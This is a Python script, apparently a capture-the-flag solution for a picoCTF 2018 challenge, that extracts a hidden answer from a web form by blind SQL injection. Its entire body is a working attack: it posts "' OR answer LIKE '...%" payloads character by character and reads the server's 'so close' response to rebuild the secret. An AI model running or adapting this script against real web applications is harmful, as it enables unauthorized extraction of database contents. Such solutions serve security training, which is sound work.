import requests
import string

url = "http://2018shell.picoctf.com:28120/answer2.php"
characters = string.ascii_letters

characters += "1"
characters += "2"
characters += "3"
characters += "4"
characters += "5"
characters += "6"
characters += "7"
characters += "8"
characters += "9"
characters += "0"
Answer = ""
params = {""}
stop = False
counter = 0
while not stop:
    for c in characters:
        params = {"answer": "' OR answer LIKE '"+Answer+c+"%", "debug": "1"}
        r = requests.post(url, params)
        if "so close" in r.text and counter <= len(characters):
            Answer += c
            counter = 0
            print(Answer)
            break
        elif counter > len(characters):
            params = {"answer": Answer, "debug": "1"}
            r = requests.post(url, params)
            Answer += " /n response: " + r.text
            stop = True
            break
        else:
            counter += 1
print(Answer)